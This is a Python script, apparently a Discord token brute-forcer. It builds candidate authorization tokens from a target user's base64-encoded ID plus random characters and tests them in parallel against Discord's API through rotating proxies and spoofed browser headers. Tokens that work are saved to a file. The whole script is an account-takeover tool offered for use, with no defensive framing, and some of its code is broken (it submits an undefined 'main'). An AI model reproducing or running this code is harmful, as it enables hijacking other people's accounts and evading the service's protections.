import httpx
import random
import base64
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore


def getproxies():
    """Proxies"""
    with open("./proxies.txt" , encoding="utf-8") as f:
        if len(f.read().splitlines()) == 0:
            return None
        else:
            proxy = random.choice(f.read().split('\n'))
            proxies = {
                "http://": "http://" + proxy,
                "https://": "https://" + proxy
            }
            return proxies

def randstr(length):
    chars = '-_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
    return ''.join([random.choice(chars) for _ in range(length)])

def run():
    token = base + randstr(6) + "." + randstr(usi)
    client = httpx.Client(proxies=getproxies())
    headers = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Authorization": token,
        "Sec-Ch-Ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "ja",
        "X-Discord-Timezone":"Asia/Tokyo",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEzLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5OTkzMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ=="
    }
    try:
        #res = client.get("https://discord.com/api/v9/users/@me/library?country_code=JP", headers=headers)
        res = client.get("https://discord.com/api/v9/users/@me/library?country_code=JP", headers=headers)
        if res.status_code == 200:
            print(f"{Fore.BLUE}[+] Vaild token - {token}")
            with open("/validtokens.txt", "a+", encoding="utf-8") as f:
                f.write(f"{token}\n")
        elif res.status_code == 403 and "message" in res.json():
            print(f"{Fore.RED}[-] Locked token - {token}")
        elif res.status_code == 401:
            print(f"{Fore.RED}[-] invaild token - {token}")
        else:
            print(f"{Fore.RED}[-] Unknown token - {token}\n{res.json()}")
    except Exception as err:
        print(f"{Fore.RED}[-] Error - {token}\n{err}")
    


if __name__ == "__main__":
    thd = int(input(f"{Fore.GREEN}[?] すれっど数 > "))
    amnt = int(input(f"{Fore.GREEN}[?] 実行回数 > "))
    usid = input(f"{Fore.GREEN}[?] ユーザーID > ")
    base = base64.b64encode(usid.encode()).decode() + "."
    if int(usid) > 970000000000000000:
        usi = 38
    else:
        usi = 27
    with ThreadPoolExecutor(max_workers=thd) as executor:
        for i in range(int(amnt)):
            executor.submit(main)